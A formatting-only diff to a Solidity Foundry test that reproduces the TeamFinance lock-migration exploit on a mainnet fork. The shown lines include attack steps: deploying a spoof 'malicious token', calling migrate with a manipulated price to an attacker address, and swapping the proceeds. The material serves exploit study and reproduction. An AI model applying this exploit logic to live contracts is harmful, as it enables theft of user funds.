@@ -126,7 +126,7 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
     // https://github.com/stakewithus/notes/blob/main/notebook/uniswap-v3/tick-and-sqrt-price-x-96.ipynb
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 15837165);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 15_837_165);
         cheat.deal(address(this), 0.5 ether);
 
         maliciousToken = new SpoofERC20();
@@ -163,7 +163,7 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
             if (i == 0) {
                 _lockTokenInTeam(msg.value);
                 maliciousToken.transfer(lockTokenImplementation, TRANSFER_AMOUNT); // Malicious token supply
-                    // manipulation.
+                // manipulation.
             } else {
                 _lockTokenInTeam(address(this).balance);
             }
@@ -234,16 +234,16 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
             params.amount1Min = 0;
             params.recipient = attackerAddress_Two;
             params.deadline = block.timestamp + 500; // The attacker specified the deadline using a constant
-                // offset against the current timestamp
+            // offset against the current timestamp
             params.refundAsETH = true;
 
             teamFinanceLock.migrate(tokenIds[i], params, true, newPriceX96, false);
 
             _exchangeAndTransfer(tokenIds[i], migrationTokens0[i], migrationTokens1[i], pairs[i]);
 
-            /* 
-            The following step is not needed for the attack itself but it is made by the attacker. 
-            This interesting approval could have many reasons such as using automated attack scripts, having 
+            /*
+            The following step is not needed for the attack itself but it is made by the attacker.
+            This interesting approval could have many reasons such as using automated attack scripts, having
             control of the contract's assets with an external account in case of a contingency, etc.
             */
 
@@ -261,9 +261,11 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
         IERC20 _from,
         IERC20, /*_to*/
         IUniswapV2Pair /*_pair*/
-    ) internal {
+    )
+        internal
+    {
         if (address(_from) == address(maliciousToken)) return; // There's no logic executed when the origin is
-            // the malicious token
+        // the malicious token
         if (_from.balanceOf(address(this)) == 0) return; // Do nothing if there's no USDC
 
         _from.approve(address(curveStablesPool), type(uint256).max);
